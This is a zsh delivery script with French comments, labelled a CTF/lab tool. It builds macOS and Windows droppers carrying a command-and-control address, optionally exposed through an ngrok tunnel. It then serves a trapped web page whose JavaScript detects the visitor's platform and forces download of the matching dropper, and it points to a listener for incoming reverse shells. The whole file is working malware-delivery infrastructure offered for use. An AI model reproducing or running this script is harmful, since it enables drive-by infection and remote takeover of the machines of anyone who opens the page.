#!/bin/zsh
# delivery/serve.sh - staging CTF/lab : URL configurable, auto-download
# RICK_NAME=updates RICK_PORT=8080 ./delivery/serve.sh
# L'URL sert une page qui declenche le telechargement du dropper automatiquement.
cd "$(dirname "$0")/.." || exit 1
PORT="${RICK_PORT:-8080}"
NAME="${RICK_NAME:-updates}"
# RICK_C2 : C2 atteint hors LAN (tunnel ngrok) - hostname ou IP
# ex: RICK_C2="0.tcp.eu.ngrok.io" RICK_C2_PORT="17432" ./delivery/serve.sh
C2="${RICK_C2:-$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null || echo 127.0.0.1)}"
C2PORT="${RICK_C2_PORT:-4444}"
./delivery/mkdropper.sh "$C2" "$C2PORT" "$NAME.command" || exit 1
./delivery/mkdropper_win.sh "$C2" "$C2PORT" "RickPortal_win.zip" 2>/dev/null || true

WEB=/tmp/rick_web
rm -rf "$WEB"; mkdir -p "$WEB"
cp "$NAME.command" "$WEB/"
cp "RickPortal_win.zip" "$WEB/" 2>/dev/null || true
cp "portal_win.vbs" "$WEB/" 2>/dev/null || true
cp delivery/windows/uninstall_win.bat "$WEB/" 2>/dev/null || true
cat > "$WEB/index.html" <<EOF
<html><head><title>portal</title></head>
<body style="background:#081408;color:#39ff88;font-family:monospace;text-align:center;padding-top:40vh">
portal opening...
<script>
var p = (navigator.platform || "") + " " + navigator.userAgent;
if (/Win/i.test(p))            location.replace("/portal_win.vbs");
else if (/Mac/i.test(p))       location.replace("/$NAME.command");
else                           location.replace("/README_mobile.txt");
</script></body></html>
EOF
cat > "$WEB/README_mobile.txt" <<'EOF2'
Ce bundle lab couvre macOS et Windows.
Mobile (iOS/Android) : pas de payload - iOS n'execute rien de telecharge,
Android necessite le module APK dedie (en construction au lab).
EOF2

LAN_IP=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null || echo 127.0.0.1)
echo "[*] page piegee (auto-download) : http://${LAN_IP}:${PORT}/"
echo "[*] dropper direct              : http://${LAN_IP}:${PORT}/${NAME}.command"
echo "[*] c2                          : ./delivery/c2.sh  (shells entrants ${C2PORT})"
echo "[*] c2 injecte dans le dropper  : ${C2}:${C2PORT} (hostname ok)"
cd "$WEB" && python3 -m http.server "$PORT"
